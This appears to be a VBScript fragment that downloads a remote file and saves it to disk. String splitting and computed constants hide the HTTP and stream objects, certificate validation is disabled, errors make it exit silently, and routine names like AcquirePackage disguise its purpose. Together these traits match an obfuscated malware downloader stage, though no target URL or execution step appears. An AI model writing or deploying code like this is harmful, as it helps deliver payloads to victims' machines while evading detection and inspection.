Sub AcquirePackage(strURL, ByRef pkgData)
    strRequestType = "MSXML2" & "." & "ServerXMLHTTP"
    Set oHTTP = CreateObject(strRequestType)
    oHTTP.setTimeouts 6148, 6371, 13417, 33743
    Dim strReqType : strReqType = Mid("XGET", 2, 3)
    oHTTP.Open strReqType, strURL, False
    Dim intCertFlag : intCertFlag = 13000 + 56
    Dim intSecId : intSecId = 3 - 1
    oHTTP.setOption intSecId, intCertFlag
    On Error Resume Next
    oHTTP.Send
    If Err.Number <> 0 Then WScript.Quit
    On Error GoTo 0
    If oHTTP.Status = 200 Then
        pkgData = oHTTP.ResponseBody
    Else
        WScript.Quit
    End If
End Sub


Sub CommitStream(binContent, strDest)
    strWriteHandler = Mid("Module=ADODB.Stream;Mode=1", 8, 12)
    Dim intDataMode : intDataMode = Len("X")
    Dim intWriteMode : intWriteMode = Len("AB")
    Set objStream = CreateObject(strWriteHandler)
    objStream.Type = intDataMode
    objStream.Open
    objStream.Write binContent
    objStream.SaveToFile strDest, intWriteMode
    objStream.Close
End Sub

Function ParsePolicyRule(strRaw)
    Dim arrParts : arrParts = Split(strRaw, "|")
    If UBound(arrParts) < 0 Then
        ParsePolicyRule = ""
    Else
        ParsePolicyRule = Trim(arrParts(0))
    End If
End Function

